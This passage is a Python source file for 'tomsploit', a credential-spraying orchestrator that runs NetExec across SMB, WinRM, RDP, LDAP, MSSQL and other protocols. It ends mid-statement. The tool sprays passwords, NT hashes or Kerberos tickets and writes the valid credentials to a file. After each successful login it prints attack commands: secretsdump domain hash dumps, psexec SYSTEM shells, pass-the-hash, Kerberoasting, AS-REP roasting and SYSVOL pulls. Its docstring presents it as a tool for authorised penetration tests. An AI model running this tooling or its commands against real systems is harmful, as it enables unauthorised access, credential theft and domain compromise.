#!/usr/bin/env python3
"""tomsploit — orchestrate nxc (NetExec) across protocols and targets.

Enumeration helper for authorised engagements (e.g. OSCP labs). Sprays
the same credential set against every available protocol, prints
follow-up commands for any successful login, and never exploits anything
automatically.
"""
# MIT License — see LICENSE block at end of file.

import argparse
import ipaddress
import json
import os
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Iterable

# ─── Colors ────────────────────────────────────────────────────────────
RED = GREEN = YELLOW = BLUE = CYAN = BOLD = DIM = RESET = ""
_COLOR_CODES = {
    "RED": "\033[91m", "GREEN": "\033[92m", "YELLOW": "\033[93m",
    "BLUE": "\033[94m", "CYAN": "\033[96m", "BOLD": "\033[1m",
    "DIM": "\033[2m", "RESET": "\033[0m",
}


def configure_colors(no_color: bool) -> None:
    if no_color or not sys.stdout.isatty():
        return
    for name, code in _COLOR_CODES.items():
        globals()[name] = code


# ─── Protocol config ───────────────────────────────────────────────────
ALL_PROTOCOLS = ["smb", "ssh", "ldap", "ftp", "wmi", "winrm", "rdp", "vnc", "mssql", "nfs"]
LOCAL_AUTH_PROTOCOLS = {"smb", "wmi", "winrm", "rdp", "mssql"}

# Default TCP port per protocol for the pre-flight probe.
PROTOCOL_PORTS = {
    "smb": 445, "ssh": 22, "ldap": 389, "ftp": 21, "wmi": 135,
    "winrm": 5985, "rdp": 3389, "vnc": 5900, "mssql": 1433, "nfs": 2049,
}

# Which protocols accept which auth methods via nxc.
# (Sending a hash to ssh/ftp/vnc/nfs makes nxc error.)
WINDOWS_PROTOS = {"smb", "winrm", "wmi", "rdp", "mssql", "ldap"}

DEFAULT_WORKERS = 15
NETEXEC_TIMEOUT = 30
SUBPROCESS_TIMEOUT = 45
PORT_PROBE_TIMEOUT = 2.0
MAX_CONSECUTIVE_TIMEOUTS = 3
BANNER_WIDTH = 60
DEFAULT_MAX_CIDR_HOSTS = 1024


class AuthType(str, Enum):
    PASSWORD = "password"
    HASH = "hash"
    KERBEROS = "kerberos"


@dataclass(frozen=True)
class Cred:
    """One (user, secret, auth_type) tuple to test."""
    user: str
    secret: str
    auth_type: AuthType

    @property
    def is_hash(self) -> bool: return self.auth_type == AuthType.HASH
    @property
    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS


@dataclass
class Success:
    """A successful nxc [+] result. May represent a real cred or a Samba
    guest-mapping pseudo-success (is_guest=True)."""
    protocol: str
    local_auth: bool
    domain: str
    user: str
    secret: str
    auth_type: AuthType
    is_admin: bool = False
    is_guest: bool = False
    raw_message: str = ""

    @property
    def is_hash(self) -> bool: return self.auth_type == AuthType.HASH
    @property
    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS
    @property
    def scope(self) -> str: return "local" if self.local_auth else "domain"
    @property
    def label(self) -> str: return f"{self.protocol.upper()} ({self.scope})"


@dataclass
class TargetResult:
    target: str
    real_ip: str = ""
    hostname: str = ""
    domain: str = ""        # AD domain from nxc info line (e.g. "DANTE.local")
    is_dc: bool = False
    elapsed: float = 0.0
    open_protocols: list[str] = field(default_factory=list)
    closed_protocols: list[str] = field(default_factory=list)
    successes: list[Success] = field(default_factory=list)   # real creds
    guests: list[Success] = field(default_factory=list)      # guest mappings
    anon_smb: bool = False
    anon_smb_lines: list[str] = field(default_factory=list)
    protocol_lines: dict[str, list[tuple[str, str]]] = field(default_factory=dict)
    target_info: str = ""
    scanned: bool = True
    skipped_reason: str = ""


# ─── nxc output parsing ────────────────────────────────────────────────

def parse_nxc_line(line: str) -> tuple[str | None, str]:
    """Find the first nxc marker on a line; return (marker, message)."""
    for marker in ("[+]", "[-]", "[*]", "[!]"):
        idx = line.find(marker)
        if idx != -1:
            return marker, line[idx + 4:].strip()
    return None, line.strip()


def parse_success_message(msg: str) -> tuple[str, str, str, bool, bool]:
    """Parse an nxc [+] message into (domain, user, secret, is_admin, is_guest).

    Examples this handles:
        WORKGROUP\\admin:Password123                       -> ('WORKGROUP','admin','Password123',False,False)
        DANTE.local\\katwamba:Diablo5679 (Pwn3d!)           -> (...,True,False)
        DANTE-NIX02\\admin:admin (Guest)                    -> (...,False,True)
        WORKGROUP\\j:aad3b...:31d6cfe0... (Pwn3d!)          -> (...,True,False)
        admin:Password123                                  -> ('','admin','Password123',False,False)
    """
    cleaned = msg.strip()
    is_admin = False
    is_guest = False

    # Strip a trailing parenthesised flag like (Pwn3d!), (adm), (Guest).
    m = re.search(r"\s*\(([^()]*)\)\s*$", cleaned)
    if m:
        flag = m.group(1).lower()
        if "guest" in flag:
            is_guest = True
        elif "pwn3d" in flag or "adm" in flag:
            is_admin = True
        cleaned = cleaned[:m.start()].rstrip()

    if not cleaned or ":" not in cleaned:
        return "", cleaned, "", is_admin, is_guest

    head, secret = cleaned.split(":", 1)
    if "\\" in head:
        domain, user = head.split("\\", 1)
    else:
        domain, user = "", head
    return domain.strip(), user.strip(), secret, is_admin, is_guest


def extract_ipv4(text: str) -> str | None:
    m = re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", text)
    return m.group(0) if m else None


def looks_like_dc(target_info: str) -> bool:
    """Heuristic DC detection from nxc's info line (e.g. 'name:DC01')."""
    if not target_info:
        return False
    m = re.search(r"name:([^\s)]+)", target_info, re.IGNORECASE)
    if not m:
        return False
    hostname = m.group(1).lower()
    return bool(re.search(r"\bdc\d*\b|^dc|pdc|addc", hostname))


def extract_hostname(target_info: str) -> str:
    m = re.search(r"name:([^\s)]+)", target_info, re.IGNORECASE)
    return m.group(1).upper() if m else ""


def extract_domain(target_info: str) -> str:
    """Pull the AD domain from nxc's [*] info line (e.g. 'domain:DANTE.local')."""
    m = re.search(r"domain:([^\s)]+)", target_info, re.IGNORECASE)
    return m.group(1) if m else ""


# ─── Suggested-command rendering ───────────────────────────────────────
# All values that get substituted into command templates pass through
# shlex.quote(), so passwords with spaces, quotes, $, etc. paste safely.

def q(v: str | None) -> str:
    """shlex.quote with a sane handling of None/empty."""
    if v is None or v == "":
        return "''"
    return shlex.quote(str(v))


def build_suggestions(s: Success, ip: str, hostname: str, is_dc: bool,
                      extra_hash: str | None) -> list[tuple[str, str]]:
    """Return [(sub_label, command_string), ...] of follow-up commands for
    a successful login.

    Guarantees:
      * Never raises — invalid inputs produce an empty list rather than
        breaking the report.
      * Every {placeholder} is shell-safe via shlex.quote.
      * Returns at least one entry for any (protocol, auth_type) we know
        about.
    """
    proto = s.protocol
    user = s.user or ""
    domain = s.domain or ""
    secret = s.secret or ""
    # The "hash to use" in PtH suggestions: prefer the success's own
    # secret if it IS a hash, otherwise fall back to -H if the user gave one.
    pth_hash = secret if s.is_hash else (extra_hash or "")

    # Build qP/qH versions of common args.
    qip   = q(ip)
    quser = q(user)
    qpw   = q(secret) if not s.is_hash else "''"
    qdom  = q(domain) if domain else "''"
    # impacket-style URL: DOMAIN/user:pw@ip — quote the whole thing as one piece
    if domain:
        url_pw   = f"{domain}/{user}:{secret}@{ip}"
        url_nopw = f"{domain}/{user}@{ip}"
    else:
        url_pw   = f"{user}:{secret}@{ip}"
        url_nopw = f"{user}@{ip}"
    qurl_pw   = q(url_pw)
    qurl_nopw = q(url_nopw)
    qhost     = q(hostname or ip)
    qfqdn     = q(f"{hostname}.{domain}" if hostname and domain else (hostname or ip))
    qhash     = q(pth_hash) if pth_hash else "''"
    # SMB-style user spec for smbclient: DOMAIN\user%password
    if domain and not s.is_hash:
        qsmb_user = q(f"{domain}\\{user}%{secret}")
    elif not s.is_hash:
        qsmb_user = q(f"{user}%{secret}")
    else:
        qsmb_user = q(f"{domain}\\{user}" if domain else user)

    entries: list[tuple[str, str]] = []

    # Password-based suggestions
    if s.auth_type == AuthType.PASSWORD:
        if proto == "smb":
            if is_dc:
                # DC + SMB creds → domain hash dump and share recon.
                # crackmapexec --shares lists what's actually available;
                # then pick a share to browse with smbclient (interactive).
                # LDAP block deliberately omits secretsdump to avoid
                # duplication when both protocols succeed (common).
                entries += [
                    ("crackmapexec --shares",
                        f"crackmapexec smb {qip} -u {quser} -p {qpw} --shares"),
                    ("secretsdump -just-dc",
                        f"impacket-secretsdump -just-dc {qurl_pw}"),
                    ("smbclient (interactive)",
                        f"smbclient //{ip}/<SHARE> -U {qsmb_user}"),
                ]
            else:
                # Non-DC SMB: enumerate shares + dump local hashes.
                entries += [
                    ("enum4linux-ng",
                        f"enum4linux-ng -A -u {quser} -p {qpw} {qip}"),
                    ("crackmapexec --shares",
                        f"crackmapexec smb {qip} -u {quser} -p {qpw} --shares"),
                    ("secretsdump (SAM+LSA+cached)",
                        f"impacket-secretsdump {qurl_pw}"),
                    ("psexec (SYSTEM shell)",
                        f"impacket-psexec {qurl_pw}"),
                    ("smbclient (interactive)",
                        f"smbclient //{ip}/<SHARE> -U {qsmb_user}"),
                ]
        elif proto == "winrm":
            # "More reliable than PSSession" per OSCP notes.
            entries.append(("evil-winrm",
                f"evil-winrm -i {qip} -u {quser} -p {qpw}"))
        elif proto == "wmi":
            entries.append(("wmiexec",
                f"impacket-wmiexec {qurl_pw}"))
        elif proto == "rdp":
            # Share-mount included for trivial file transfer back to Kali.
            entries.append(("xfreerdp3 (+share mount)",
                f"xfreerdp3 /u:{quser} /p:{qpw} /d:{qdom} /v:{qip} "
                f"/dynamic-resolution /drive:share,/home/kali /cert:ignore"))
        elif proto == "mssql":
            # Two entries: the client, then the xp_cmdshell SQL block
            # (rendered as a multi-line note, not a shell command).
            entries.append(("mssqlclient",
                f"impacket-mssqlclient {qurl_pw} -windows-auth"))
        elif proto == "ldap":
            if is_dc:
                # LDAP block focuses on AD enumeration. secretsdump lives
                # in the SMB block when SMB also succeeds — avoiding dup.
                entries += [
                    ("kerbrute userenum",
                        f"kerbrute userenum --dc {qip} -d {qdom} "
                        f"/usr/share/seclists/Usernames/Names/names.txt"),
                    ("AS-REP roast",
                        f"impacket-GetNPUsers {qdom}/{quser}:{qpw} "
                        f"-request -format hashcat -outputfile asrep.hash "
                        f"-dc-ip {qip}"),
                    ("Kerberoast (SPN tickets)",
                        f"impacket-GetUserSPNs -request -dc-ip {qip} "
                        f"{qdom}/{quser}:{qpw} -outputfile kerb.hash"),
                    ("BloodHound",
                        f"bloodhound-python -u {quser} -p {qpw} -d {qdom} "
                        f"-dc {qfqdn} -ns {qip} -c All --zip"),
                    ("ldapdomaindump",
                        f"ldapdomaindump -u "
                        f"{q(domain + chr(92) + user) if domain else quser} "
                        f"-p {qpw} {qip}"),
                ]
            else:
                entries.append(("ldapdomaindump",
                    f"ldapdomaindump -u "
                    f"{q(domain + chr(92) + user) if domain else quser} "
                    f"-p {qpw} {qip}"))
        elif proto == "ssh":
            entries.append(("ssh (no host-key prompts)",
                f"ssh -o UserKnownHostsFile=/dev/null "
                f"-o StrictHostKeyChecking=no {q(user + '@' + ip)}"))
        elif proto == "ftp":
            entries += [
                ("ftp (active mode)",
                    f"ftp -A {qip}"),
                ("wget (recursive pull)",
                    f"wget -r ftp://{q(user)}:{q(secret)}@{ip}/"),
            ]
        elif proto == "vnc":
            entries.append(("vncviewer",
                f"vncviewer {qip}"))
        elif proto == "nfs":
            entries += [
                ("showmount -e",
                    f"showmount -e {qip}"),
                ("mount NFS export",
                    f"sudo mkdir -p /mnt/nfs && "
                    f"sudo mount -t nfs -o nolock,vers=3 "
                    f"{ip}:<EXPORT> /mnt/nfs"),
            ]

    # ─── Hash-based suggestions (Pass-the-Hash) ────────────────────────
    elif s.auth_type == AuthType.HASH:
        hash_arg = q(pth_hash) if pth_hash else "NT"
        if proto == "smb":
            if is_dc:
                entries += [
                    ("crackmapexec --shares [PtH]",
                        f"crackmapexec smb {qip} -u {quser} -H {qhash} --shares"),
                    ("secretsdump -just-dc [PtH]",
                        f"impacket-secretsdump -just-dc {qurl_nopw} "
                        f"-hashes :{hash_arg}"),
                    ("psexec [PtH]",
                        f"impacket-psexec {qurl_nopw} -hashes :{hash_arg}"),
                ]
            else:
                entries += [
                    ("crackmapexec --shares [PtH]",
                        f"crackmapexec smb {qip} -u {quser} -H {qhash} --shares"),
                    ("secretsdump (SAM+LSA) [PtH]",
                        f"impacket-secretsdump {qurl_nopw} -hashes :{hash_arg}"),
                    ("psexec [PtH]",
                        f"impacket-psexec {qurl_nopw} -hashes :{hash_arg}"),
                    ("wmiexec [PtH]",
                        f"impacket-wmiexec {qurl_nopw} -hashes :{hash_arg}"),
                ]
        elif proto == "winrm":
            entries.append(("evil-winrm [PtH]",
                f"evil-winrm -i {qip} -u {quser} -H {qhash}"))
        elif proto == "wmi":
            entries.append(("wmiexec [PtH]",
                f"impacket-wmiexec {qurl_nopw} -hashes :{hash_arg}"))
        elif proto == "rdp":
            entries.append(("xfreerdp3 [PtH]",
                f"xfreerdp3 /u:{quser} /pth:{qhash} /d:{qdom} /v:{qip} "
                f"/dynamic-resolution /drive:share,/home/kali /cert:ignore"))
        elif proto == "mssql":
            entries.append(("mssqlclient [PtH]",
                f"impacket-mssqlclient {qurl_nopw} -hashes :{hash_arg} "
                f"-windows-auth"))
        elif proto == "ldap" and is_dc:
            entries += [
                ("BloodHound [PtH]",
                    f"bloodhound-python -u {quser} --hashes :{hash_arg} "
                    f"-d {qdom} -dc {qfqdn} -ns {qip} -c All --zip"),
                ("Kerberoast [PtH]",
                    f"impacket-GetUserSPNs -request -dc-ip {qip} "
                    f"-hashes :{hash_arg} {qdom}/{quser} "
                    f"-outputfile kerb.hash"),
            ]
        elif proto == "ldap":
            entries.append(("getTGT (then use as -k)",
                f"impacket-getTGT {qdom}/{quser} -hashes :{hash_arg}"))

    # ─── Kerberos ticket-cache suggestions ─────────────────────────────
    elif s.auth_type == AuthType.KERBEROS:
        if proto == "smb":
            entries.append(("psexec -k",
                f"impacket-psexec -k -no-pass {qurl_nopw}"))
            if is_dc:
                entries.append(("secretsdump -just-dc -k",
                    f"impacket-secretsdump -just-dc -k -no-pass {qurl_nopw}"))
        elif proto == "winrm":
            entries.append(("evil-winrm -r",
                f"evil-winrm -i {qip} -u {quser} -r {qdom}"))
        elif proto == "ldap" and is_dc:
            entries.append(("BloodHound -k",
                f"bloodhound-python -u {quser} -k --no-pass "
                f"-d {qdom} -dc {qfqdn} -ns {qip} -c All --zip"))

    return entries


# ─── Display ───────────────────────────────────────────────────────────

ANON_SMB_COMMANDS = [
    ("list shares",          "smbclient -L //{ip} -N"),
    ("connect to a share",   "smbclient //{ip}/<SHARE> -N"),
    ("enum4linux-ng",        "enum4linux-ng -A {ip}"),
    ("crackmapexec shares",  "crackmapexec smb {ip} -u '' -p '' --shares"),
    ("recursive pull SYSVOL", "smbclient //{ip}/SYSVOL -N -c 'recurse ON; prompt OFF; mget *'"),
]


def print_anon_smb_commands(ip: str) -> None:
    print(f"\n  {CYAN}{BOLD}💡 Anonymous SMB — Suggested Next Steps{RESET}")
    print(f"  {'─' * (BANNER_WIDTH - 2)}")
    for i, (label, tmpl) in enumerate(ANON_SMB_COMMANDS):
        if i > 0:
            print()
        print(f"        {DIM}# {label}{RESET}")
        print(f"        {tmpl.format(ip=ip)}")
    print()


def print_suggested_commands(result: TargetResult, extra_hash: str | None) -> None:
    """Render the headline section: one block per (protocol, auth_type)
    combination that produced a real success."""
    if not result.successes:
        return

    # Group by (protocol, auth_type) so a host with both password and hash
    # success on SMB doesn't print duplicate blocks.
    seen: set[tuple[str, AuthType]] = set()
    blocks: list[tuple[Success, list[tuple[str, str]]]] = []
    # Sort by canonical protocol order so output is stable across runs.
    def sort_key(s: Success) -> tuple[int, int]:
        try:
            return (ALL_PROTOCOLS.index(s.protocol), int(s.local_auth))
        except ValueError:
            return (len(ALL_PROTOCOLS), int(s.local_auth))
    for s in sorted(result.successes, key=sort_key):
        key = (s.protocol, s.auth_type)
        if key in seen:
            continue
        seen.add(key)
        try:
            entries = build_suggestions(
                s, ip=result.real_ip or result.target,
                hostname=result.hostname,
                is_dc=result.is_dc,
                extra_hash=extra_hash,
            )
        except Exception as exc:
            # build_suggestions promises not to raise, but defence in depth:
            # a single broken suggestion must never hide the others.
            entries = [("error",
                        f"# suggestion builder failed: "
                        f"{exc.__class__.__name__}: {exc}")]
        if entries:
            blocks.append((s, entries))

    if not blocks:
        return

    dc_tag = f" {YELLOW}[DC]{RESET}" if result.is_dc else ""
    print(f"  {CYAN}{BOLD}💡 Suggested Commands{RESET}{dc_tag}")
    print(f"  {'─' * (BANNER_WIDTH - 2)}")
    for s, entries in blocks:
        # Protocol heading
        header = f"[{s.protocol.upper()}"
        if s.auth_type == AuthType.HASH:
            header += " · PtH"
        elif s.auth_type == AuthType.KERBEROS:
            header += " · Kerberos"
        header += "]"
        print(f"\n    {GREEN}►{RESET} {BOLD}{header}{RESET}")

        # One entry = one labelled command on its own line, with a blank
        # line between entries so nothing visually runs together.
        for i, (sub_label, cmd) in enumerate(entries):
            if i > 0:
                print()
            print(f"        {DIM}# {sub_label}{RESET}")
            print(f"        {cmd}")
    print()


def print_target_header(target: str) -> None:
    print(f"  {GREEN}{BOLD}► {target}{RESET}")


def print_port_probe(result: TargetResult, quiet: bool) -> None:
    if quiet or not result.closed_protocols:
        return
    n_open = len(result.open_protocols)
    n_total = n_open + len(result.closed_protocols)
    skipped = ", ".join(p.upper() for p in result.closed_protocols)
    print(f"    {DIM}↳ Port probe: {n_open}/{n_total} open · skipping {skipped}{RESET}\n")


def status_icon(lines: list[tuple[str, str]]) -> str:
    has_success = any(m == "[+]" for m, _ in lines)
    has_skip = any(m == "[!]" for m, _ in lines)
    if has_success: return f"{GREEN}✔{RESET}"
    if has_skip:    return f"{YELLOW}⏱{RESET}"
    return f"{RED}✘{RESET}"


def print_protocol_results(result: TargetResult, quiet: bool) -> None:
    ip_tag = (f" {DIM}({result.real_ip}){RESET}"
              if result.real_ip and result.real_ip != result.target else "")
    dc_tag = f" {YELLOW}{BOLD}[DC]{RESET}" if result.is_dc else ""
    elapsed_tag = f" {DIM}[{result.elapsed:.1f}s]{RESET}" if result.elapsed > 0 else ""

    print(f"\n{'─' * BANNER_WIDTH}")
    print(f"  {CYAN}{BOLD}📋 Results{RESET}{ip_tag}{dc_tag}{elapsed_tag}")
    print(f"{'─' * BANNER_WIDTH}")

    if result.target_info and not quiet:
        print(f"    {DIM}{result.target_info}{RESET}")
    print()

    # Anonymous SMB
    if result.anon_smb_lines:
        anon_parsed = [(m, msg) for m, msg in
                       [parse_nxc_line(l) for l in result.anon_smb_lines]
                       if m in ("[+]", "[-]", "[!]")]
        if anon_parsed:
            icon = status_icon(anon_parsed)
            first = True
            for marker, msg in anon_parsed:
                prefix = (f"  {icon} {BOLD}{'SMB (anon)':<20}{RESET}" if first
                          else f"      {'':<20}")
                first = False
                if marker == "[+]":
                    print(f"{prefix} {YELLOW}{msg}{RESET}")
                elif marker == "[-]" and not quiet:
                    print(f"{prefix} {DIM}{msg}{RESET}")
                elif marker == "[!]":
                    print(f"{prefix} {YELLOW}{msg}{RESET}")

    # Per-protocol blocks (keep canonical order)
    quiet_protos: list[str] = []
    for proto in ALL_PROTOCOLS:
        for scope in (False, True):
            key = f"{proto}-{'local' if scope else 'domain'}"
            lines = result.protocol_lines.get(key)
            if not lines:
                continue
            if not any(m in ("[+]", "[-]", "[!]") for m, _ in lines):
                quiet_protos.append(f"{proto.upper()} ({'local' if scope else 'domain'})")
                continue
            label = f"{proto.upper()} ({'local' if scope else 'domain'})"
            icon = status_icon(lines)
            first = True
            for marker, msg in lines:
                if marker not in ("[+]", "[-]", "[!]"):
                    continue
                prefix = (f"  {icon} {BOLD}{label:<20}{RESET}" if first
                          else f"      {'':<20}")
                first = False
                if marker == "[+]":
                    print(f"{prefix} {GREEN}{msg}{RESET}")
                elif marker == "[-]" and not quiet:
                    print(f"{prefix} {DIM}{msg}{RESET}")
                elif marker == "[!]":
                    print(f"{prefix} {YELLOW}{msg}{RESET}")

    if quiet_protos and not quiet:
        print(f"\n  {DIM}── No findings: {', '.join(quiet_protos)}{RESET}")
    print(f"\n{'─' * BANNER_WIDTH}")


def print_valid_section(result: TargetResult, extra_hash: str | None,
                        quiet: bool) -> None:
    has_anything = (result.successes or result.guests or result.anon_smb)
    if not has_anything:
        if not quiet:
            print(f"\n  {RED}{BOLD}✗ No valid credentials found.{RESET}\n")
        print(f"{'═' * BANNER_WIDTH}\n")
        return

    # Anon SMB next steps
    if result.anon_smb:
        print_anon_smb_commands(result.real_ip or result.target)

    # Real credentials
    if result.successes:
        # Stable display order: canonical protocol order, then domain before local
        def sort_key(s: Success) -> tuple[int, int]:
            try:
                return (ALL_PROTOCOLS.index(s.protocol), int(s.local_auth))
            except ValueError:
                return (len(ALL_PROTOCOLS), int(s.local_auth))
        ordered = sorted(result.successes, key=sort_key)
        print(f"\n  {GREEN}{BOLD}✓ VALID CREDENTIALS{RESET}\n")
        for s in ordered:
            badge = f" {YELLOW}[admin]{RESET}" if s.is_admin else ""
            print(f"    {GREEN}►{RESET} {BOLD}{s.label:<20}{RESET} "
                  f"{DIM}│{RESET} {s.raw_message}{badge}")
        print()

    # Guest mappings — surfaced but explicitly NOT treated as real auth
    if result.guests:
        print(f"  {YELLOW}{BOLD}⚠ GUEST MAPPING — likely not real auth{RESET}")
        print(f"  {DIM}Samba's `map to guest = bad user` accepts any creds and "
              f"downgrades to guest.{RESET}")
        print(f"  {DIM}Treat as info disclosure, not a working login.{RESET}\n")
        for s in result.guests:
            print(f"    {YELLOW}►{RESET} {BOLD}{s.label:<20}{RESET} "
                  f"{DIM}│{RESET} {s.raw_message}")
        print()

    # THE headline output — suggested commands for real creds
    if result.successes:
        print_suggested_commands(result, extra_hash)

    print(f"{'═' * BANNER_WIDTH}\n")


# ─── Input handling ────────────────────────────────────────────────────

def read_value_or_file(source: str) -> list[str]:
    if os.path.isfile(source):
        try:
            with open(source) as f:
                return [line.strip() for line in f if line.strip()]
        except OSError as exc:
            raise ValueError(f"Cannot read '{source}': {exc}") from exc
    return [source]


def expand_targets(specs: Iterable[str], max_hosts: int) -> list[str]:
    """Expand IPs, hostnames, and CIDRs into a deduplicated, order-preserved
    list of hosts."""
    out: list[str] = []
    seen: set[str] = set()
    for raw in specs:
        spec = raw.strip()
        if not spec:
            continue
        if "/" in spec:
            try:
                net = ipaddress.ip_network(spec, strict=False)
            except ValueError:
                if spec not in seen:
                    seen.add(spec); out.append(spec)
                continue
            if net.num_addresses > max_hosts:
                raise ValueError(
                    f"{spec} expands to {net.num_addresses} hosts "
                    f"(cap: {max_hosts}). Raise with --max-cidr-hosts."
                )
            hosts = ([net.network_address] if net.num_addresses == 1
                     else list(net.hosts()))
            for h in hosts:
                addr = str(h)
                if addr not in seen:
                    seen.add(addr); out.append(addr)
        else:
            if spec not in seen:
                seen.add(spec); out.append(spec)
    return out


def parse_protocol_list(spec: str | None) -> list[str]:
    if not spec:
        return list(ALL_PROTOCOLS)
    items = {s.strip().lower() for s in spec.split(",") if s.strip()}
    unknown = items - set(ALL_PROTOCOLS)
    if unknown:
        raise ValueError(
            f"Unknown protocol(s): {', '.join(sorted(unknown))}. "
            f"Valid: {', '.join(ALL_PROTOCOLS)}"
        )
    return [p for p in ALL_PROTOCOLS if p in items]


# ─── Port probe ────────────────────────────────────────────────────────

def tcp_probe(host: str, port: int) -> bool:
    try:
        with socket.create_connection((host, port), timeout=PORT_PROBE_TIMEOUT):
            return True
    except (OSError, socket.timeout):
        return False


def probe_protocols(host: str, protos: list[str]) -> list[str]:
    """Return protocols whose default port answers a TCP connect, in
    canonical order."""
    open_set: set[str] = set()
    with ThreadPoolExecutor(max_workers=10) as pool:
        futs = {pool.submit(tcp_probe, host, PROTOCOL_PORTS[p]): p for p in protos}
        for f in as_completed(futs):
            try:
                if f.result():
                    open_set.add(futs[f])
            except Exception:
                pass
    return [p for p in protos if p in open_set]


# ─── Credential file ───────────────────────────────────────────────────

CREDS_HEADER = (
    "# tomsploit valid credentials\n"
    "# target\tprotocol\tscope\tdomain\tuser\tauth_type\tsecret\tprivilege\ttimestamp\n"
)


def append_creds(path: str, result: TargetResult) -> None:
    if not result.successes:
        return
    is_new = not os.path.exists(path)
    now = datetime.now().isoformat(timespec="seconds")
    with open(path, "a") as f:
        if is_new:
            f.write(CREDS_HEADER)
        for s in result.successes:
            f.write("\t".join([
                result.real_ip or result.target,
                s.protocol, s.scope,
                s.domain or "-", s.user,
                s.auth_type.value, s.secret,
                "admin" if s.is_admin else "user",
                now,
            ]) + "\n")


# ─── Orchestrator ──────────────────────────────────────────────────────

class TomSploit:
    def __init__(self, *, targets, users, passwords, hashes, kerberos,
                 protocols, log_file, creds_file, json_out, workers,
                 quiet, debug, no_port_probe, extra_hash):
        self.targets = targets
        self.users = users
        self.passwords = passwords
        self.hashes = hashes
        self.kerberos = kerberos
        self.protocols = protocols
        self.log_file = log_file
        self.creds_file = creds_file
        self.json_out = json_out
        self.workers = workers
        self.quiet = quiet
        self.debug = debug
        self.no_port_probe = no_port_probe
        self.extra_hash = extra_hash  # for PtH command suggestions

        self.creds = self._build_creds()
        if not self.creds:
            raise ValueError("No credentials to test (need -p, -H, or -k).")

        # Cancellation
        self._stop = threading.Event()
        self._procs_lock = threading.Lock()
        self._procs: set[subprocess.Popen] = set()

        # Progress
        self._progress_lock = threading.Lock()
        self._done = 0
        self._total = 0

    def _build_creds(self) -> list[Cred]:
        if self.kerberos:
            return [Cred(u, "", AuthType.KERBEROS) for u in self.users]
        pairs: list[Cred] = []
        pairs += [Cred(u, p, AuthType.PASSWORD)
                  for u in self.users for p in self.passwords]
        pairs += [Cred(u, h, AuthType.HASH)
                  for u in self.users for h in self.hashes]
        return pairs

    def cancel(self) -> None:
        self._stop.set()
        with self._procs_lock:
            for proc in list(self._procs):
                try:
                    proc.terminate()
                except OSError:
                    pass

    # ─── progress bar ─
    def _redraw(self) -> None:
        if self._total <= 0:
            return
        pct = int(100 * self._done / self._total)
        bar_len = 20
        filled = int(bar_len * self._done / self._total)
        bar = "█" * filled + "░" * (bar_len - filled)
        sys.stderr.write(
            f"\r  {DIM}{bar} {pct:3d}% ({self._done}/{self._total}){RESET} "
        )
        sys.stderr.flush()

    def _tick(self, n: int = 1) -> None:
        with self._progress_lock:
            self._done += n
            self._redraw()

    def _clear_progress(self) -> None:
        sys.stderr.write("\r" + " " * 70 + "\r")
        sys.stderr.flush()

    def _say(self, msg: str) -> None:
        with self._progress_lock:
            self._clear_progress()
            print(msg, flush=True)
            self._redraw()

    # ─── subprocess wrapper ─
    def _run_proc(self, cmd: list[str], timeout: float) -> tuple[str, str, bool]:
        """Run nxc. Returns (stdout, stderr, timed_out)."""
        if self._stop.is_set():
            raise InterruptedError()
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, text=True)
        except FileNotFoundError as exc:
            return "", f"executable not found: {exc.filename}", False
        with self._procs_lock:
            self._procs.add(proc)
        try:
            try:
                out, err = proc.communicate(timeout=timeout)
                return out or "", err or "", False
            except subprocess.TimeoutExpired:
                proc.kill()
                try:
                    proc.communicate(timeout=2)
                except subprocess.TimeoutExpired:
                    pass
                return "", "", True
        finally:
            with self._procs_lock:
                self._procs.discard(proc)

    # ─── one nxc invocation ─
    def _nxc_cmd(self, proto: str, target: str, cred: Cred,
                 local_auth: bool) -> list[str]:
        cmd = ["nxc", proto, target, "-u", cred.user]
        if cred.is_kerberos:
            cmd.append("--use-kcache")
        elif cred.is_hash:
            cmd.extend(["-H", cred.secret])
        else:
            cmd.extend(["-p", cred.secret])
        if local_auth:
            cmd.append("--local-auth")
        cmd.extend(["--timeout", str(NETEXEC_TIMEOUT), "--log", self.log_file])
        return cmd

    # ─── one (protocol, scope) task ─
    def _scan_protocol(self, proto: str, target: str,
                        local_auth: bool) -> tuple[list[tuple[str, str]], list[Success], str]:
        """Run every credential pair against (proto, local_auth) for one
        target. Returns (status_lines, successes, target_info)."""
        lines: list[tuple[str, str]] = []
        successes: list[Success] = []
        target_info = ""
        consecutive_timeouts = 0
        scope_label = "local" if local_auth else "domain"

        for cred in self.creds:
            if self._stop.is_set():
                break

            # Skip auth methods this protocol can't use (e.g. hash vs ssh).
            if cred.is_hash and proto not in WINDOWS_PROTOS:
                self._tick(); continue
            if cred.is_kerberos and proto not in WINDOWS_PROTOS:
                self._tick(); continue

            cmd = self._nxc_cmd(proto, target, cred, local_auth)
            try:
                stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
            except InterruptedError:
                break

            if timed_out:
                consecutive_timeouts += 1
                self._tick()
                if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
                    lines.append(("[!]",
                                  f"{MAX_CONSECUTIVE_TIMEOUTS} consecutive timeouts — skipped"))
                    self._say(f"  {YELLOW}⏱ {proto.upper()} ({scope_label}){RESET} "
                              f"{DIM}consecutive timeouts — skipping{RESET}")
                    # Tick the remaining attempts so the bar stays honest.
                    self._tick(len(self.creds) - (self.creds.index(cred) + 1))
                    break
                continue
            consecutive_timeouts = 0

            # Parse stdout
            for raw in stdout.split("\n"):
                marker, msg = parse_nxc_line(raw.strip())
                if marker == "[*]":
                    if not target_info:
                        target_info = msg
                elif marker == "[+]":
                    lines.append((marker, msg))
                    domain, user, secret, is_admin, is_guest = parse_success_message(msg)
                    if not secret:
                        secret = cred.secret
                        user = user or cred.user
                    success = Success(
                        protocol=proto, local_auth=local_auth,
                        domain=domain, user=user, secret=secret,
                        auth_type=cred.auth_type,
                        is_admin=is_admin, is_guest=is_guest,
                        raw_message=msg,
                    )
                    successes.append(success)
                    color = YELLOW if is_guest else GREEN
                    tag = " [Guest]" if is_guest else ""
                    self._say(f"  {color}{BOLD}⚡ {proto.upper()} ({scope_label}){RESET} "
